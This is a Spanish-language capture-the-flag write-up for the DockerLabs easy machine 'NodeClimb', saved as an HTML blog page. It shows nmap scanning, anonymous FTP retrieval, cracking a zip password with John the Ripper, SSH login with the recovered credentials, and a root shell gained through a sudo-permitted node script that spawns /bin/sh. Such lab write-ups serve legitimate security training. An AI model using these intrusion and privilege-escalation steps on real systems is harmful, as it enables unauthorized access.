@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | NodeClimb</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">NodeClimb</h2>
+          <small class="date">05 Jul 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">facil</a>
+            
+          </div>
+        </div>
+        <div class="content"><p><img src="/assets/images/node/node.png" alt="image" /></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+</code></pre></div></div>
+
+<p>Vemos que solo tiene los puertos <strong>21</strong> y <strong>22</strong>  abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22 172.17.0.2
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 <span class="nb">cd</span>:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 <span class="o">(</span>ED25519<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vemos que nos podemos conectar al servidor <strong>ftp</strong> como usuario <em>anónimo</em> y que además hay un fichero a nuestro alcance. Entramos como <strong>ftp</strong> y nos lo descargamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp ftp@172.17.0.2
+Connected to 172.17.0.2.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|8580|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
+226 Directory send OK.
+ftp&gt; get secretitopicaron.zip
+<span class="nb">local</span>: secretitopicaron.zip remote: secretitopicaron.zip
+229 Entering Extended Passive Mode <span class="o">(||</span>|49269|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>secretitopicaron.zip <span class="o">(</span>242 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************</span>|   242        1.77 MiB/s    00:00 ETA
+226 Transfer complete.
+242 bytes received <span class="k">in </span>00:00 <span class="o">(</span>183.76 KiB/s<span class="o">)</span>
+ftp&gt; bye
+221 Goodbye.
+</code></pre></div></div>
+
+<p>Intentamos descomprimirlo pero vemos que tiene una contraseña. Creamos el hash del fichero zip con <strong>zip2john</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john secretitopicaron.zip <span class="o">&gt;</span> zip.hash
+ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>52, <span class="nv">decmplen</span><span class="o">=</span>40, <span class="nv">crc</span><span class="o">=</span>59D5D024 <span class="nv">ts</span><span class="o">=</span>4C03 <span class="nv">cs</span><span class="o">=</span>4c03 <span class="nb">type</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Y después intentamos sacar la password del fichero zip:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+password1        <span class="o">(</span>secretitopicaron.zip/password.txt<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2024-07-05 23:00<span class="o">)</span> 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
+</code></pre></div></div>
+
+<p>En un segundo tenemos la clave, descomprimimos el fichero y la vemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>password.txt 
+mario:laKontraseñAmasmalotaHdelbarrioH
+</code></pre></div></div>
+
+<p>Nos conectamos al servidor <strong>ssh</strong> como <em>mario</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mario@172.17.0.2
+mario@172.17.0.2<span class="s1">'s password: 
+Linux 014bc8cff695 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
+</span></code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vemos que puede ejecutar como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>mario on 014bc8cff695:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User mario may run the following commands on 014bc8cff695:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/node /home/mario/script.js
+</code></pre></div></div>
+
+<p>Puede ejecutar un script en node que esta vacio en el home de mario. Miramos a ver si hay algo en el historial de bash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> /usr/local/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> 
+/usr/local/bin/node
+locate node
+apt <span class="nb">install </span>locate
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+/usr/bin/node
+<span class="nb">sudo</span> /usr/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+<span class="nb">ls
+exit
+ls
+whoami
+sudo</span> <span class="nt">-l</span>
+<span class="nb">cat </span>script.js 
+<span class="nb">ls</span> <span class="nt">-l</span>
+<span class="nb">exit</span>
+
+</code></pre></div></div>
+
+<p>Curiosamente nos da una pista de cómo obtener la shell desde node. Añadimos al fichero <strong>script.js</strong> la función para la creación de una shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> <span class="o">&gt;</span> script.js
+</code></pre></div></div>
+
+<p>Y ejecutamos el comando con sudo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/node /home/mario/script.js# <span class="nb">whoami</span><span class="p">;</span><span class="nb">hostname</span><span class="p">;</span><span class="nb">date
+</span>root
+014bc8cff695
+Fri Jul  5 21:14:24 UTC 2024
+<span class="c">#</span>
+</code></pre></div></div>
+
+<p>Con esto ya seriamos <strong>root</strong> en la máquina.</p>
+
+<p>Un saludo</p>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
